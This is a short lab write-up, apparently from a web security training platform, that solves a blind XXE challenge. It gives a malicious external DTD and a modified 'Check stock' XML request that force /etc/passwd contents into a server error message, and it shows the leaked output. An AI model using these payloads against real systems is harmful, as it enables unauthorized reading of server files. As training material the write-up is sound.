# Lab 06: Exploiting Blind XXE to Retrieve Data via Error Messages

### 🎯 Objective
Retrieve the contents of the `/etc/passwd` file by triggering a verbose XML parsing error message that reflects the file's data.

### 🔍 Vulnerability Analysis: Error-Based XXE
In this scenario, the application is "blind" because it doesn't return data in successful responses. However, by intentionally causing a file system error using a malicious DTD, we can force the server to display the contents of a sensitive file within the error message itself.



### 🛠️ Exploitation Process

#### 1. Crafting the Malicious DTD
I hosted the following DTD on the provided **Exploit Server**. This payload uses nested parameter entities to read a file and then attempt to access a non-existent path named after that file's content.

**Payload:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;

    %file: Reads /etc/passwd.

    %eval: Defines the %exfil entity. The &#x25; is the HTML entity for %, required for nesting.

    %exfil: Triggers a FileNotFoundException by looking for a path like /invalid/[FILE_CONTENT].

2. Triggering the Attack

I modified the "Check stock" POST request to reference my malicious DTD:
XML

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "[https://exploit-server.net/exploit.]">
    %xxe;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>

3. Analyzing the Response

The server returned a 500 Internal Server Error. Because the XML parser attempted to resolve the invalid path containing the file data, the error message leaked the contents of /etc/passwd:

Response Snippet:
java.io.FileNotFoundException: /invalid/root:x:0:0:root:/root:/bin/bash...
🚩 Result

    Evidence: Captured the /etc/passwd content directly from the server's error response.

    Status: ✅ Solved
